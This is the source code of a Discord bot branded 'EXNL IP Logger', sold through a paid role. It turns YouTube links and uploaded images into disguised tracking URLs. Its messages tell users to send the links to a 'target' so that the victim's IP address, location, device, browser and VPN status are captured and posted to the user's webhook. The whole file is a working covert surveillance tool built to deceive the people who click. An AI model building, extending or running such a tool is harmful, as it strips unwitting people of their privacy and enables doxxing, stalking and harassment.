
const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, StringSelectMenuBuilder } = require('discord.js');
const fetch = require('node-fetch');

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages
    ]
});

const REQUIRED_ROLE_ID = '1419809093178228777';
const API_BASE_URL = process.env.API_BASE_URL || 'http://localhost:5000';

// Store user webhooks temporarily
const userWebhooks = new Map();

client.once('ready', () => {
    console.log(`🤖 Discord IP Logger Bot is ready! Logged in as ${client.user.tag}`);
    registerSlashCommands();
});

async function registerSlashCommands() {
    const commands = [
        new SlashCommandBuilder()
            .setName('iplogger')
            .setDescription('Generate tracking links for IP logging')
            .addSubcommand(subcommand =>
                subcommand
                    .setName('youtube')
                    .setDescription('Create a YouTube tracking link')
                    .addStringOption(option =>
                        option.setName('url')
                            .setDescription('YouTube video URL')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('image')
                    .setDescription('Create an image tracking link')
                    .addAttachmentOption(option =>
                        option.setName('image')
                            .setDescription('Image file to use for tracking')
                            .setRequired(true)
                    )
            )
            .addSubcommand(subcommand =>
                subcommand
                    .setName('webhook')
                    .setDescription('Set your webhook URL for receiving IP logs')
                    .addStringOption(option =>
                        option.setName('url')
                            .setDescription('Discord webhook URL')
                            .setRequired(true)
                    )
            )
    ];

    try {
        await client.application.commands.set(commands);
        console.log('✅ Slash commands registered successfully!');
    } catch (error) {
        console.error('❌ Failed to register commands:', error);
    }
}

client.on('interactionCreate', async interaction => {
    if (!interaction.isChatInputCommand()) return;

    // Check if user has required role
    if (!hasRequiredRole(interaction.member)) {
        const noPermsEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ NO PERMS ON ACCOUNT | PURCHASE ROLE')
            .setDescription('You need the required role to use this command.')
            .setTimestamp();

        return interaction.reply({ embeds: [noPermsEmbed], ephemeral: true });
    }

    const { commandName, options } = interaction;

    if (commandName === 'iplogger') {
        const subcommand = options.getSubcommand();

        try {
            switch (subcommand) {
                case 'youtube':
                    await handleYouTubeCommand(interaction);
                    break;
                case 'image':
                    await handleImageCommand(interaction);
                    break;
                case 'webhook':
                    await handleWebhookCommand(interaction);
                    break;
            }
        } catch (error) {
            console.error('Command error:', error);
            await interaction.reply({
                content: '❌ An error occurred while processing your request.',
                ephemeral: true
            });
        }
    }
});

function hasRequiredRole(member) {
    if (!member || !member.roles) return false;
    return member.roles.cache.has(REQUIRED_ROLE_ID);
}

async function handleWebhookCommand(interaction) {
    const webhookUrl = interaction.options.getString('url');

    // Validate webhook URL
    if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Invalid Webhook URL')
            .setDescription('Please provide a valid Discord webhook URL.')
            .setTimestamp();

        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }

    // Test webhook
    try {
        const testResponse = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: '✅ Webhook Test Successful',
                    description: 'Your webhook has been configured for IP logging!',
                    color: 0x00FF00,
                    timestamp: new Date().toISOString()
                }]
            })
        });

        if (!testResponse.ok) {
            throw new Error('Webhook test failed');
        }

        userWebhooks.set(interaction.user.id, webhookUrl);

        const successEmbed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('✅ Webhook Configured Successfully')
            .setDescription('Your webhook URL has been saved. IP logs will be sent to this webhook.')
            .addFields({
                name: '📡 Webhook URL',
                value: `\`${webhookUrl.substring(0, 50)}...\``,
                inline: false
            })
            .setTimestamp();

        await interaction.reply({ embeds: [successEmbed], ephemeral: true });

    } catch (error) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Webhook Configuration Failed')
            .setDescription('Unable to configure webhook. Please check the URL and permissions.')
            .setTimestamp();

        await interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }
}

async function handleYouTubeCommand(interaction) {
    const youtubeUrl = interaction.options.getString('url');

    // Extract video ID from YouTube URL
    const videoId = extractYouTubeVideoId(youtubeUrl);
    
    if (!videoId) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Invalid YouTube URL')
            .setDescription('Please provide a valid YouTube video URL.')
            .setTimestamp();

        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }

    // Generate tracking link
    const trackingId = generateTrackingId();
    const trackingUrl = `${API_BASE_URL}/yt/${trackingId}?v=${videoId}`;

    const embed = new EmbedBuilder()
        .setColor('#FF0000')
        .setTitle('🎥 YouTube Tracking Link Generated')
        .setDescription('Your YouTube tracking link has been created!')
        .addFields(
            {
                name: '🔗 Original Video',
                value: `[Click here](${youtubeUrl})`,
                inline: false
            },
            {
                name: '🎯 Tracking Link',
                value: `\`${trackingUrl}\``,
                inline: false
            },
            {
                name: '📋 Instructions',
                value: 'Copy the tracking link and send it to your target. When they click it, their IP and device info will be logged.',
                inline: false
            }
        )
        .setThumbnail(`https://img.youtube.com/vi/${videoId}/maxresdefault.jpg`)
        .setFooter({ text: '🕵️ EXNL IP Logger | YouTube Tracker' })
        .setTimestamp();

    // Create copy button
    const row = new ActionRowBuilder()
        .addComponents(
            new ButtonBuilder()
                .setCustomId(`copy_youtube_${trackingId}`)
                .setLabel('📋 Copy Tracking Link')
                .setStyle(ButtonStyle.Primary)
        );

    try {
        await interaction.reply({ embeds: [embed], components: [row], ephemeral: true });
        
        // Send to user's DM
        const dmEmbed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('🎯 Your YouTube Tracking Link | EXNL')
            .setDescription('Here\'s your tracking link - copy and send this to your target!')
            .addFields({
                name: '🔗 Tracking URL',
                value: `\`${trackingUrl}\``,
                inline: false
            })
            .setFooter({ text: 'When someone clicks this link, you\'ll get their IP and location data!' })
            .setTimestamp();

        await interaction.user.send({ embeds: [dmEmbed] });

        // Store tracking data with webhook if configured
        storeTrackingData(interaction.user.id, {
            type: 'youtube',
            originalUrl: youtubeUrl,
            trackingUrl: trackingUrl,
            trackingId: trackingId,
            videoId: videoId,
            webhook: userWebhooks.get(interaction.user.id)
        });

    } catch (error) {
        console.error('YouTube command error:', error);
    }
}

async function handleImageCommand(interaction) {
    const imageAttachment = interaction.options.getAttachment('image');

    if (!imageAttachment || !imageAttachment.contentType?.startsWith('image/')) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Invalid Image')
            .setDescription('Please provide a valid image file.')
            .setTimestamp();

        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    try {
        // Download and process image
        const imageResponse = await fetch(imageAttachment.url);
        const imageBuffer = await imageResponse.buffer();
        const imageBase64 = imageBuffer.toString('base64');

        // Generate tracking link
        const trackingId = generateTrackingId();
        const fileName = imageAttachment.name.split('.')[0];
        const extension = imageAttachment.name.split('.').pop();
        const trackingUrl = `${API_BASE_URL}/${fileName}_${trackingId}.${extension}`;

        // Store image data (you'll need to implement this in your API)
        await storeImageForTracking(trackingId, {
            imageData: imageBase64,
            imageType: imageAttachment.contentType,
            imageName: imageAttachment.name,
            userId: interaction.user.id,
            webhook: userWebhooks.get(interaction.user.id)
        });

        const embed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('📸 Image Tracking Link Generated')
            .setDescription('Your image tracking link has been created!')
            .addFields(
                {
                    name: '🖼️ Original Image',
                    value: `\`${imageAttachment.name}\``,
                    inline: false
                },
                {
                    name: '🎯 Tracking Link',
                    value: `\`${trackingUrl}\``,
                    inline: false
                },
                {
                    name: '📋 Instructions',
                    value: 'Copy the tracking link and send it to your target. When they view the image, their IP and device info will be logged.',
                    inline: false
                }
            )
            .setImage(imageAttachment.url)
            .setFooter({ text: '🕵️ EXNL IP Logger | Image Tracker' })
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`copy_image_${trackingId}`)
                    .setLabel('📋 Copy Tracking Link')
                    .setStyle(ButtonStyle.Success)
            );

        await interaction.editReply({ embeds: [embed], components: [row] });

        // Send to user's DM
        const dmEmbed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('🎯 Your Image Tracking Link | EXNL')
            .setDescription('Here\'s your tracking link - copy and send this to your target!')
            .addFields({
                name: '🔗 Tracking URL',
                value: `\`${trackingUrl}\``,
                inline: false
            })
            .setFooter({ text: 'When someone views this image, you\'ll get their IP and location data!' })
            .setTimestamp();

        await interaction.user.send({ embeds: [dmEmbed] });

    } catch (error) {
        console.error('Image command error:', error);
        await interaction.editReply({
            content: '❌ Failed to process image. Please try again.',
            ephemeral: true
        });
    }
}

// Handle button interactions
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, type, trackingId] = interaction.customId.split('_');

    if (action === 'copy') {
        const trackingData = getTrackingData(interaction.user.id, trackingId);
        
        if (trackingData) {
            const copyEmbed = new EmbedBuilder()
                .setColor('#00FF00')
                .setTitle('📋 Link Copied!')
                .setDescription(`Your ${type} tracking link has been copied to your DMs.`)
                .addFields({
                    name: '🎯 Tracking URL',
                    value: `\`${trackingData.trackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [copyEmbed], ephemeral: true });
        }
    }
});

// Utility functions
function extractYouTubeVideoId(url) {
    const regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#&?]*).*/;
    const match = url.match(regExp);
    return (match && match[7].length === 11) ? match[7] : null;
}

function generateTrackingId() {
    return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

const trackingStorage = new Map();

function storeTrackingData(userId, data) {
    if (!trackingStorage.has(userId)) {
        trackingStorage.set(userId, []);
    }
    trackingStorage.get(userId).push(data);
}

function getTrackingData(userId, trackingId) {
    const userTrackingData = trackingStorage.get(userId) || [];
    return userTrackingData.find(data => data.trackingId === trackingId);
}

async function storeImageForTracking(trackingId, imageData) {
    // This would integrate with your existing API to store the image
    try {
        const response = await fetch(`${API_BASE_URL}/api/store-tracking-image`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                trackingId,
                ...imageData
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to store image');
        }
        
        return await response.json();
    } catch (error) {
        console.error('Failed to store tracking image:', error);
        throw error;
    }
}

// IP log webhook sender
async function sendIpLogToWebhook(webhookUrl, logData) {
    if (!webhookUrl) return;

    const embed = {
        title: '🎯 New IP Log Captured | EXNL',
        color: 0xFF0000,
        fields: [
            {
                name: '🌐 IP Address',
                value: `\`${logData.ipAddress}\``,
                inline: true
            },
            {
                name: '📍 Location',
                value: logData.location || 'Unknown',
                inline: true
            },
            {
                name: '💻 Device',
                value: `${logData.deviceType || 'Unknown'} - ${logData.operatingSystem || 'Unknown'}`,
                inline: false
            },
            {
                name: '🌐 Browser',
                value: `${logData.browserName || 'Unknown'} ${logData.browserVersion || ''}`,
                inline: true
            },
            {
                name: '🛡️ VPN Status',
                value: logData.isVpn === 'yes' ? '🚨 VPN Detected' : '✅ Direct Connection',
                inline: true
            },
            {
                name: '🔗 Referrer',
                value: logData.referrer || 'Direct Access',
                inline: false
            },
            {
                name: '🕐 Timestamp',
                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                inline: false
            }
        ],
        footer: {
            text: '🕵️ EXNL IP Logger Bot',
            icon_url: 'https://cdn.discordapp.com/emojis/853928735535742986.png'
        },
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Failed to send webhook:', error);
    }
}

// Login to Discord
client.login(process.env.DISCORD_BOT_TOKEN);

module.exports = { client, sendIpLogToWebhook };
